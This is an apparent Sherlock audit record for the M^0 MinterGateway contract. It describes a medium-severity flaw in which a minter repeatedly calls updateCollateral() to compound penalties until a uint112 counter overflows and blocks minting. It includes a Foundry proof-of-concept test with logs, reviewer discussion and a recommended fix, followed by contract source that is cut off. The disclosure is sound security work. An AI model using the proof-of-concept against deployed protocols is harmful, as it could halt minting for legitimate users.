{
  "Title": "M-2: Malicious minters can repeatedly penalize their undercollateralized accounts in a short peroid of time, which can result in disfunctioning of critical protocol functions, such as `mintM`.",
  "Content": "# Issue M-2: Malicious minters can repeatedly penalize their undercollateralized accounts in a short peroid of time, which can result in disfunctioning of critical protocol functions, such as `mintM`. \n\nSource: https://github.com/sherlock-audit/2023-10-mzero-judging/issues/45 \n\n## Found by \npkqs90\n## Summary\n\nMalicious minters can exploit the `updateCollateral()` function to repeatedly penalize their undercollateralized accounts in a short peroid of time. This can make the `principalOfTotalActiveOwedM` to reach `uint112.max` limit, disfunctioning some critical functions, such as `mintM`.\n\n## Vulnerability Detail\n\nThe `updateCollateral()` function allows minters to update their collateral status to the protocol, with penalties imposed in two scenarios:\n\n1. A penalty is imposed for each missing collateral update interval.\n2. A penalty is imposed if a minter is undercollateralized.\n\nThe critical issue arises with the penalty for being undercollateralized, which is imposed on each call to `updateCollateral()`. This penalty is compounded, calculated as `penaltyRate * (principalOfActiveOwedM_ - principalOfMaxAllowedActiveOwedM_)`, and the `principalOfActiveOwedM_` increases with each imposed penalty.\n\nGiven that validator provides timely information about the off-chain collateral (according to https://docs.m0.org/portal/overview/glossary#validator), a minter could potentially gather validator signatures with high frequency (for example, every minute). With a sufficient collection of signatures, a malicious minter could launch an attack in a very short timeframe, not giving validators time to deactivate the minter.\n\n## Proof Of Concept\n\nWe can do a simple calculation, using the numbers from unit tests, mintRatio=90%, penaltyRate=1%, updateCollateralInterval=2000 (seconds). A malicious minter deposits `$100,000` t-bills as collateral, and mints `$90,000` M tokens. Since M tokens have 6 decimals, the collateral would be `100000e6`. Following the steps below, the malicious minter would be able to increase `principalOfActiveOwedM_` close to uint112.max limit:\n\n1. Deposit collateral and mint M tokens.\n2. Wait for 4 collateral update intervals. This is for accumulating some initial penalty to get undercollateralized.\n3. Call `updateCollateral()`. The penalty for missing updates would be `4 * 90000e6 * 1% = 36e8`.\n4. Starting from `36e8`, we can keep calling `updateCollateral()` to compound penalty for undercollateralization. Each time would increase the penalty by 1%. We only need `log(2^112 / 36e8, 1.01) ~ 5590` times to hit `uint112.max` limit.\n\nAdd the following testing code to `MinterGateway.t.sol`. We can see in logs that `principalOfTotalActiveOwedM` has hit uint112.max limit.\n\n```bash\n  penalty: 1 94536959275 94536000000\n  penalty: 2 95482328867 95481360000\n  penalty: 3 96437152156 96436173600\n  penalty: 4 97401523678 97400535336\n  penalty: 5 98375538914 98374540689\n  penalty: 6 99359294302 99358286095\n  penalty: 7 100352887244 100351868955\n  penalty: 8 101356416116 101355387644\n  penalty: 9 102369980277 102368941520\n  penalty: 10 103393680080 103392630935\n  ...\n  penalty: 5990 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5991 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5992 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5993 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5994 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5995 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5996 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5997 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5998 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 5999 5192349545726433803396851311815959 5192296858534827628530496329220095\n  penalty: 6000 5192349545726433803396851311815959 5192296858534827628530496329220095\n```\n\n```solidity\n    // Using default test settings: mintRatio = 90%, penaltyRate = 1%, updateCollateralInterval = 2000.\n    function test_penaltyForUndercollateralization() external {\n        // 1. Minter1 deposits $100,000 t-bills, and mints 90,000 $M Tokens.\n        uint initialTimestamp = block.timestamp;\n        _minterGateway.setCollateralOf(_minter1, 100000e6);\n        _minterGateway.setUpdateTimestampOf(_minter1, initialTimestamp);\n        _minterGateway.setRawOwedMOf(_minter1, 90000e6);\n        _minterGateway.setPrincipalOfTotalActiveOwedM(90000e6);\n\n        // 2. Minter does not update for 4 updateCollateralIntervals, causing penalty for missing updates.\n        vm.warp(initialTimestamp + 4 * _updateCollateralInterval);\n\n        // 3. Minter fetches a lot of signatures from validator, each with different timestamp and calls `updateCollateral()` many times.\n        //    Since the penalty for uncollateralization is counted every time, and would hit `uint112.max` at last.\n        uint256[] memory retrievalIds = new uint256[](0);\n        address[] memory validators = new address[](1);\n        validators[0] = _validator1;\n\n        for (uint i = 1; i <= 6000; ++i) {\n\n            uint256[] memory timestamps = new uint256[](1);\n            uint256 signatureTimestamp = initialTimestamp + i;\n            timestamps[0] = signatureTimestamp;\n            bytes[] memory signatures = new bytes[](1);\n            signatures[0] = _getCollateralUpdateSignature(\n                address(_minterGateway),\n                _minter1,\n                100000e6,\n                retrievalIds,\n                bytes32(0),\n                signatureTimestamp,\n                _validator1Pk\n            );\n\n            vm.prank(_minter1);\n            _minterGateway.updateCollateral(100000e6, retrievalIds, bytes32(0), validators, timestamps, signatures);\n\n            console.log(\"penalty:\", i, _minterGateway.totalActiveOwedM(), _minterGateway.principalOfTotalActiveOwedM());\n        }\n    }\n```\n\nNote that in real use case, the penalty rate may lower (e.g. 0.1%), however, `log(2^112 / 36e8, 1.001) ~ 55656` is still a reasonable amount since there are 1440 minutes in 1 day (not to mention if the frequency for signature may be higher than once per minute). A malicious minter can still gather enough signatures for the attack.\n\n## Impact\n\nThe direct impact is that `principalOfTotalActiveOwedM` will hit `uint112.max` limit. All related protocol features would be disfunctioned, the most important one being `mintM`, since the function would revert if `principalOfTotalActiveOwedM` hits uint112.max limit.\n\n```solidity\n        unchecked {\n            uint256 newPrincipalOfTotalActiveOwedM_ = uint256(principalOfTotalActiveOwedM_) + principalAmount_;\n\n            // As an edge case precaution, prevent a mint that, if all owed M (active and inactive) was converted to\n            // a principal active amount, would overflow the `uint112 principalOfTotalActiveOwedM`.\n>           if (\n>               // NOTE: Round the principal up for worst case.\n>               newPrincipalOfTotalActiveOwedM_ + _getPrincipalAmountRoundedUp(totalInactiveOwedM) >= type(uint112).max\n>           ) {\n>               revert OverflowsPrincipalOfTotalOwedM();\n>           }\n\n            principalOfTotalActiveOwedM = uint112(newPrincipalOfTotalActiveOwedM_);\n            _rawOwedM[msg.sender] += principalAmount_; // Treat rawOwedM as principal since minter is active.\n        }\n```\n\n## Code Snippet\n\n- https://github.com/MZero-Labs/protocol/blob/main/src/MinterGateway.sol#L206\n- https://github.com/MZero-Labs/protocol/blob/main/src/MinterGateway.sol#L303-L308\n\n## Tool used\n\nFoundary\n\n## Recommendation\n\nConsider only imposing penalty for undercollateralization for each update interval.\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  6000 signatures will definately ring a bell for the validator to check for malicious activity; remember the validator atest to the eligible collatreal.\n\n\n\n**deluca-mike**\n\nWhile a valid finding, it would require validators and governance to really be sleeping at the wheel and/or behaving on reckless autopilot.\n\nWe should probably fix it by preventing the update collateral from penalizing the minter more than once per missed update.\n\nHowever, consider than by attempting to do this, the Minter is losing all their off-chain collateral and being deactivated, and the reckless validators will likely lose their validator gig.\n\n**toninorair**\n\nValid issue, medium severity, great catch ðŸ‘ \n\n**pasha9990**\n\nI think this not valid because we need signature and new timestamp for every update and that is impossible \n\n",
  "Impact": "MEDIUM",
  "Source": "https://app.sherlock.xyz/audits/contests/124",
  "Code": [
    {
      "filename": "src/MinterGateway.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity 0.8.23;\n\nimport { SignatureChecker } from \"../lib/common/src/libs/SignatureChecker.sol\";\n\nimport { ERC712Extended } from \"../lib/common/src/ERC712Extended.sol\";\nimport { UIntMath } from \"../lib/common/src/libs/UIntMath.sol\";\n\nimport { TTGRegistrarReader } from \"./libs/TTGRegistrarReader.sol\";\n\nimport { IContinuousIndexing } from \"./interfaces/IContinuousIndexing.sol\";\nimport { IMToken } from \"./interfaces/IMToken.sol\";\nimport { IMinterGateway } from \"./interfaces/IMinterGateway.sol\";\nimport { IRateModel } from \"./interfaces/IRateModel.sol\";\n\nimport { ContinuousIndexing } from \"./abstract/ContinuousIndexing.sol\";\nimport { ContinuousIndexingMath } from \"./libs/ContinuousIndexingMath.sol\";\n\n/*\n\nâ–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—\nâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•\nâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•    â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•\nâ–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘  â•šâ–ˆâ–ˆâ•”â•\nâ–ˆâ–ˆâ•‘ â•šâ•â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘    â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘\nâ•šâ•â•     â•šâ•â•â•šâ•â•â•šâ•â•  â•šâ•â•â•â•   â•šâ•â•   â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•     â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•   â•šâ•â•   â•šâ•â•â•â•â•â•â• â•šâ•â•â•â•šâ•â•â• â•šâ•â•  â•šâ•â•   â•šâ•â•\n\n-->> Where money is born. <<--\n\n*/\n\n/**\n * @title  MinterGateway\n * @author M^0 Labs\n * @notice Minting Gateway of M Token for all approved by TTG and activated minters.\n */\ncontract MinterGateway is IMinterGateway, ContinuousIndexing, ERC712Extended {\n    /* ============ Structs ============ */\n\n    /**\n     * @notice Mint proposal struct.\n     * @param  id          The unique ID of the mint proposal.\n     * @param  createdAt   The timestamp at which the mint proposal was created.\n     * @param  destination The address to mint M to.\n     * @param  amount      The amount of M to mint.\n     */\n    struct MintProposal {\n        // 1st slot\n        uint48 id;\n        uint40 createdAt;\n        address destination;\n        // 2nd slot\n        uint240 amount;\n    }\n\n    /**\n     * @notice Minter state struct.\n     * @param  isActive                Whether the minter is active or not.\n     * @param  isDeactivated           Whether the minter is deactivated or not.\n     * @param  collateral              The amount of collateral the minter has.\n     * @param  totalPendingRetrievals  The total amount of pending retrievals.\n     * @param  updateTimestamp         The timestamp at which the minter last updated their collateral.\n     * @param  penalizedUntilTimestamp The timestamp until which the minter is penalized.\n     * @param  frozenUntilTimestamp    The timestamp until which the minter is frozen.\n     * @param  latestProposedRetrievalTimestamp The timestamp at which the minter last proposed a retrieval.\n     */\n    struct MinterState {\n        // 1st slot\n        bool isActive;\n        bool isDeactivated;\n        uint240 collateral;\n        // 2nd slot\n        uint240 totalPendingRetrievals;\n        // 3rd slot\n        uint40 updateTimestamp;\n        uint40 penalizedUntilTimestamp;\n        uint40 frozenUntilTimestamp;\n        uint40 latestProposedRetrievalTimestamp;\n    }\n\n    /* ============ Variables ============ */\n\n    /// @inheritdoc IMinterGateway\n    uint16 public constant ONE = 10_000;\n\n    /// @inheritdoc IMinterGateway\n    uint32 public constant MAX_MINT_RATIO = 65_000;\n\n    /// @notice IMinterGateway\n    uint32 public constant MIN_UPDATE_COLLATERAL_INTERVAL = 3_600;\n\n    // solhint-disable-next-line max-line-length\n    /// @dev keccak256(\"UpdateCollateral(address minter,uint256 collateral,uint256[] retrievalIds,bytes32 metadataHash,uint256 timestamp)\")\n    /// @inheritdoc IMinterGateway\n    bytes32 public constant UPDATE_COLLATERAL_TYPEHASH =\n        0x22b57ca54bd15c6234b29e87aa1d76a0841b6e65e63d7acacef989de0bc3ff9e;\n\n    /// @inheritdoc IMinterGateway\n    address public immutable ttgRegistrar;\n\n    /// @inheritdoc IMinterGateway\n    address public immutable ttgVault;\n\n    /// @inheritdoc IMinterGateway\n    address public immutable mToken;\n\n    /// @inheritdoc IMinterGateway\n    uint240 public totalInactiveOwedM;\n\n    /// @inheritdoc IMinterGateway\n    uint112 public principalOfTotalActiveOwedM;\n\n    /// @dev Nonce used to generate unique mint proposal IDs.\n    uint48 internal _mintNonce;\n\n    /// @dev Nonce used to generate unique retrieval proposal IDs.\n    uint48 internal _retrievalNonce;\n\n    /// @dev The state of each minter, their collaterals, relevant timestamps, and total pending retrievals.\n    mapping(address minter => MinterState state) internal _minterStates;\n\n    /// @dev The mint proposals of minter (mint ID, creation timestamp, destination, amount).\n    mapping(address minter => MintProposal proposal) internal _mintProposals;\n\n    /// @dev The owed M of active and inactive minters (principal of active, inactive).\n    mapping(address minter => uint240 rawOwedM) internal _rawOwedM;\n\n    /// @dev The pending collateral retrievals of minter (retrieval ID, amount).\n    mapping(address minter => mapping(uint48 retrievalId => uint240 amount)) internal _pendingCollateralRetrievals;\n\n    /// @dev The last update signature timestamp of each validator for each minter.\n    mapping(address minter => mapping(address validator => uint256 timestamp)) internal _lastSignatureTimestamp;\n\n    /* ============ Modifiers ============ */\n\n    /**\n     * @notice Only allow active minter to call function.\n     * @param  minter_ The address of the minter to check.\n     */\n    modifier onlyActiveMinter(address minter_) {\n        _revertIfInactiveMinter(minter_);\n\n        _;\n    }\n\n    /// @notice Only allow approved validator in TTG to call function.\n    modifier onlyApprovedValidator() {\n        _revertIfNotApprovedValidator(msg.sender);\n\n        _;\n    }\n\n    /// @notice Only allow unfrozen minter to call function.\n    modifier onlyUnfrozenMinter() {\n        _revertIfFrozenMinter(msg.sender);\n\n        _;\n    }\n\n    /* ============ Constructor ============ */\n\n    /**\n     * @notice Constructor.\n     * @param  ttgRegistrar_ The address of the TTG Registrar contract.\n     * @param  mToken_        The address of the M Token.\n     */\n    constructor(address ttgRegistrar_, address mToken_) ContinuousIndexing() ERC712Extended(\"MinterGateway\") {\n        if ((ttgRegistrar = ttgRegistrar_) == address(0)) revert ZeroTTGRegistrar();\n        if ((ttgVault = TTGRegistrarReader.getVault(ttgRegistrar_)) == address(0)) revert ZeroTTGVault();\n        if ((mToken = mToken_) == address(0)) revert ZeroMToken();\n    }\n\n    /* ============ Interactive Functions ============ */\n\n    /// @inheritdoc IMinterGateway\n    function updateCollateral(\n        uint256 collateral_,\n        uint256[] calldata retrievalIds_,\n        bytes32 metadataHash_,\n        address[] calldata validators_,\n        uint256[] calldata timestamps_,\n        bytes[] calldata signatures_\n    ) external onlyActiveMinter(msg.sender) returns (uint40 minTimestamp_) {\n        if (validators_.length != signatures_.length || signatures_.length != timestamps_.length) {\n            revert SignatureArrayLengthsMismatch();\n        }\n\n        // Verify that enough valid signatures are provided, and get the minimum timestamp across all valid signatures.\n        minTimestamp_ = _verifyValidatorSignatures(\n            msg.sender,\n            collateral_,\n            retrievalIds_,\n            metadataHash_,\n            validators_,\n            timestamps_,\n            signatures_\n        );\n\n        _imposePenaltyIfMissedCollateralUpdates(msg.sender);\n\n        _imposePenaltyIfUndercollateralized(msg.sender, minTimestamp_);\n\n        uint240 safeCollateral_ = UIntMath.safe240(collateral_);\n        uint240 totalResolvedCollateralRetrieval_ = _resolvePendingRetrievals(msg.sender, retrievalIds_);\n\n        emit CollateralUpdated(\n            msg.sender,\n            safeCollateral_,\n            totalResolvedCollateralRetrieval_,\n            metadataHash_,\n            minTimestamp_\n        );\n\n        _updateCollateral(msg.sender, safeCollateral_, minTimestamp_);\n\n        // NOTE: Above functionality already has access to `currentIndex()`, and since the completion of the collateral\n        //       update can result in a new rate, we should update the index here to lock in that rate.\n        updateIndex();\n    }\n\n    /// @inheritdoc IMinterGateway\n    function proposeRetrieval(uint256 collateral_) external onlyActiveMinter(msg.sender) returns (uint48 retrievalId_) {\n        if (collateral_ == 0) revert ZeroRetrievalAmount();\n\n        unchecked {\n            retrievalId_ = ++_retrievalNonce;\n        }\n\n        MinterState storage minterState_ = _minterStates[msg.sender];\n        uint240 currentCollateral_ = minterState_.collateral;\n        uint240 safeCollateral_ = UIntMath.safe240(collateral_);\n        uint240 updatedTotalPendingRetrievals_ = minterState_.totalPendingRetrievals + safeCollateral_;\n\n        // NOTE: Revert if collateral is less than sum of all pending retrievals even if there is no owed M by minter.\n        if (currentCollateral_ < updatedTotalPendingRetrievals_) {\n            revert RetrievalsExceedCollateral(updatedTotalPendingRetrievals_, currentCollateral_);\n        }\n\n        minterState_.latestProposedRetrievalTimestamp = uint40(block.timestamp);\n        minterState_.totalPendingRetrievals = updatedTotalPendingRetrievals_;\n        _pendingCollateralRetrievals[msg.sender][retrievalId_] = safeCollateral_;\n\n        _revertIfUndercollateralized(msg.sender, 0);\n\n        emit RetrievalCreated(retrievalId_, msg.sender, safeCollateral_);\n    }\n\n    /// @inheritdoc IMinterGateway\n    function proposeMint(\n        uint256 amount_,\n        address destination_\n    ) external onlyActiveMinter(msg.sender) onlyUnfrozenMinter returns (uint48 mintId_) {\n        if (amount_ == 0) revert ZeroMintAmount();\n        if (destination_ == address(0)) revert ZeroMintDestination();\n\n        uint240 safeAmount_ = UIntMath.safe240(amount_);\n\n        _revertIfUndercollateralized(msg.sender, safeAmount_); // Ensure minter remains sufficiently collateralized.\n\n        unchecked {\n            mintId_ = ++_mintNonce;\n        }\n\n        _mintProposals[msg.sender] = MintProposal(mintId_, uint40(block.timestamp), destination_, safeAmount_);\n\n        emit MintProposed(mintId_, msg.sender, safeAmount_, destination_);\n    }\n\n    /// @inheritdoc IMinterGateway\n    function mintM(\n        uint256 mintId_\n    ) external onlyActiveMinter(msg.sender) onlyUnfrozenMinter returns (uint112 principalAmount_, uint240 amount_) {\n        MintProposal storage mintProposal_ = _mintProposals[msg.sender];\n\n        uint48 id_;\n        uint40 createdAt_;\n        address destination_;\n        (id_, createdAt_, destination_, amount_) = (\n            mintProposal_.id,\n            mintProposal_.createdAt,\n            mintProposal_.destination,\n            mintProposal_.amount\n        );\n\n        if (id_ != mintId_) revert InvalidMintProposal();\n\n        unchecked {\n            // Check that mint proposal is executable.\n            uint40 activeAt_ = createdAt_ + mintDelay();\n            if (block.timestamp < activeAt_) revert PendingMintProposal(activeAt_);\n\n            uint40 expiresAt_ = activeAt_ + mintTTL();\n            if (block.timestamp > expiresAt_) revert ExpiredMintProposal(expiresAt_);\n        }\n\n        _revertIfUndercollateralized(msg.sender, amount_); // Ensure minter remains sufficiently collateralized.\n\n        delete _mintProposals[msg.sender]; // Delete mint request.\n\n        // Adjust principal of active owed M for minter.\n        // NOTE: When minting a present amount, round the principal up in favor of the protocol.\n        principalAmount_ = _getPrincipalAmountRoundedUp(amount_);\n        uint112 principalOfTotalActiveOwedM_ = principalOfTotalActiveOwedM;\n\n        emit MintExecuted(id_, msg.sender, principalAmount_, amount_);\n\n        unchecked {\n            uint256 newPrincipalOfTotalActiveOwedM_ = uint256(principalOfTotalActiveOwedM_) + principalAmount_;\n\n            // As an edge case precaution, prevent a mint that, if all owed M (active and inactive) was converted to\n            // a principal active amount, would overflow the `uint112 principalOfTotalActiveOwedM`.\n            if (\n                // NOTE: Round the principal up for worst case.\n                newPrincipalOfTotalActiveOwedM_ + _getPrincipalAmountRoundedUp(totalInactiveOwedM) >= type(uint112).max\n            ) {\n                revert OverflowsPrincipalOfTotalOwedM();\n            }\n\n            principalOfTotalActiveOwedM = uint112(newPrincipalOfTotalActiveOwedM_);\n            _rawOwedM[msg.sender] += principalAmount_; // Treat rawOwedM as principal since minter is active.\n        }\n\n        IMToken(mToken).mint(destination_, amount_);\n\n        // NOTE: Above functionality already has access to `currentIndex()`, and since the completion of the mint\n        //       can result in a new rate, we should update the index here to lock in that rate.\n        updateIndex();\n    }\n\n    /// @inheritdoc IMinterGateway\n    function burnM(address minter_, uint256 maxAmount_) external returns (uint112 principalAmount_, uint240 amount_) {\n        (principalAmount_, amount_) = burnM(\n            minter_,\n            _getPrincipalAmountRoundedDown(UIntMath.safe240(maxAmount_)),\n            maxAmount_\n        );\n    }\n\n    /// @inheritdoc IMinterGateway\n    function burnM(\n        address minter_,\n        uint256 maxPrincipalAmount_,\n        uint256 maxAmount_\n    ) public returns (uint112 principalAmount_, uint240 amount_) {\n        if (maxPrincipalAmount_ == 0 || maxAmount_ == 0) revert ZeroBurnAmount();\n\n        MinterState storage minterState_ = _minterStates[minter_];\n        bool isActive_ = minterState_.isActive;\n\n        // Revert early if minter has not been activated.\n        if (!isActive_ && !minterState_.isDeactivated) revert InactiveMinter();\n\n        if (isActive_) {\n            // NOTE: Penalize only for missed collateral updates, not for undercollateralization.\n            // Undercollateralization within one update interval is forgiven.\n            _imposePenaltyIfMissedCollateralUpdates(minter_);\n\n            (principalAmount_, amount_) = _repayForActiveMinter(\n                minter_,\n                UIntMath.safe112(maxPrincipalAmount_),\n                UIntMath.safe240(maxAmount_)\n            );\n\n            emit BurnExecuted(minter_, principalAmount_, amount_, msg.sender);\n        } else {\n            amount_ = _repayForDeactivatedMinter(minter_, UIntMath.safe240(maxAmount_));\n\n            emit BurnExecuted(minter_, amount_, msg.sender);\n        }\n\n        IMToken(mToken).burn(msg.sender, amount_); // Burn actual M tokens\n\n        // NOTE: Above functionality already has access to `currentIndex()`, and since the completion of the burn\n        //       can result in a new rate, we should update the index here to lock in that rate.\n        updateIndex();\n    }\n\n    /// @inheritdoc IMinterGateway\n    function cancelMint(address minter_, uint256 mintId_) external onlyApprovedValidator {\n        uint48 id_ = _mintProposals[minter_].id;\n\n        if (id_ != mintId_ || id_ == 0) revert InvalidMintProposal();\n\n        delete _mintProposals[minter_];\n\n        emit MintCanceled(id_, minter_, msg.sender);\n    }\n\n    /// @inheritdoc IMinterGateway\n    function freezeMinter(address minter_) external onlyApprovedValidator returns (uint40 frozenUntil_) {\n        unchecked {\n            _minterStates[minter_].frozenUntilTimestamp = frozenUntil_ = uint40(block.timestamp) + minterFreezeTime();\n        }\n\n        emit MinterFrozen(minter_, frozenUntil_);\n    }\n\n    /// @inheritdoc IMinterGateway\n    function activateMinter(address minter_) external {\n        if (!isMinterApproved(minter_)) revert NotApprovedMinter();\n\n        MinterState storage minterState_ = _minterStates[minter_];\n\n        // NOTE: Once deactivated, a minter cannot be reactivated.\n        if (minterState_.isDeactivated) revert DeactivatedMinter();\n\n        minterState_.isActive = true;\n\n        emit MinterActivated(minter_, msg.sender);\n    }\n\n    /// @inheritdoc IMinterGateway\n    function deactivateMinter(address minter_) external onlyActiveMinter(minter_) returns (uint240 inactiveOwedM_) {\n        if (isMinterApproved(minter_)) revert StillApprovedMinter();\n\n        _imposePenaltyIfMissedCollateralUpdates(minter_);\n\n        uint112 principalOfOwedM_ = principalOfActiveOwedMOf(minter_);\n\n        inactiveOwedM_ = _getPresentAmount(principalOfOwedM_);\n\n        unchecked {\n            // Treat rawOwedM as principal since minter is active.\n            principalOfTotalActiveOwedM -= principalOfOwedM_;\n            totalInactiveOwedM += inactiveOwedM_;\n        }\n\n        emit MinterDeactivated(minter_, inactiveOwedM_, msg.sender);\n\n        // Reset reasonable aspects of minter's state\n        delete _minterStates[minter_];\n        delete _mintProposals[minter_];\n\n        // Deactivate minter.\n        _minterStates[minter_].isDeactivated = true;\n\n        _rawOwedM[minter_] = inactiveOwedM_; // Treat rawOwedM as inactive owed M since minter is now inactive.\n\n        // NOTE: Above functionality already has access to `currentIndex()`, and since the completion of the\n        //       deactivation can result in a new rate, we should update the index here to lock in that rate.\n        updateIndex();\n    }\n\n    /// @inheritdoc IContinuousIndexing\n    function updateIndex() public override(IContinuousIndexing, ContinuousIndexing) returns (uint128 index_) {\n        // NOTE: Since the currentIndex of the Minter Gateway and mToken are constant through this context's execution\n        //       (the block.timestamp is not changing) we can compute excessOwedM without updating the mToken index.\n        uint240 excessOwedM_ = excessOwedM();\n\n        if (excessOwedM_ > 0) IMToken(mToken).mint(ttgVault, excessOwedM_); // Mint M to TTG Vault.\n\n        // NOTE: Above functionality already has access to `currentIndex()`, and since the completion of the collateral\n        //       update can result in a new rate, we should update the index here to lock in that rate.\n        // NOTE: With the current rate models, the minter rate does not depend on anything in the Minter Gateway\n        //       or mToken, so we can update the minter rate and index here.\n        index_ = super.updateIndex(); // Update minter index and rate.\n\n        // NOTE: Given the current implementation of the mToken transfers and its rate model, while it is possible for\n        //       the above mint to already have updated the mToken index if M was minted to an earning account, we want\n        //       to ensure the rate provided by the mToken's rate model is locked in.\n        IMToken(mToken).updateIndex(); // Update earning index and rate.\n    }\n\n    /* ============ View/Pure Functions ============ */\n\n    /// @inheritdoc IMinterGateway\n    function totalActiveOwedM() public view returns (uint240) {\n        return _getPresentAmount(principalOfTotalActiveOwedM);\n    }\n\n    /// @inheritdoc IMinterGateway\n    function totalOwedM() external view returns (uint240) {\n        unchecked {\n            // NOTE: This can never overflow since the `mint` functions caps the principal of total owed M (active and\n            //       inactive) to `type(uint112).max`. Thus, there can never be enough inactive owed M (which is an\n            //       accumulations principal of active owed M values converted to present values at previous and lower\n            //       indices) or active owed M to overflow this.\n            return totalActiveOwedM() + totalInactiveOwedM;\n        }\n    }\n\n    /// @inheritdoc IMinterGateway\n    function excessOwedM() public view returns (uint240 excessOwedM_) {\n        // NOTE: Can safely cast to `uint240` since we know M Token totalSupply constraints.\n        uint240 totalMSupply_ = uint240(IMToken(mToken).totalSupply());\n\n        uint240 totalOwedM_ = _getPresentAmountRoundedDown(principalOfTotalActiveOwedM, currentIndex()) +\n            totalInactiveOwedM;\n\n        unchecked {\n            if (totalOwedM_ > totalMSupply_) return totalOwedM_ - totalMSupply_;\n        }\n    }\n\n    /// @inheritdoc IMinterGateway\n    function minterRate() external view returns (uint32) {\n        return _latestRate;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function isActiveMinter(address minter_) external view returns (bool) {\n        return _minterStates[minter_].isActive;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function isDeactivatedMinter(address minter_) external view returns (bool) {\n        return _minterStates[minter_].isDeactivated;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function isFrozenMinter(address minter_) external view returns (bool) {\n        return block.timestamp < _minterStates[minter_].frozenUntilTimestamp;\n    }\n\n    /// @inheritdoc IMinterGateway\n    function principalOfActiveOwedMOf(address minter_) public view returns (uint112) {\n        // NOTE: 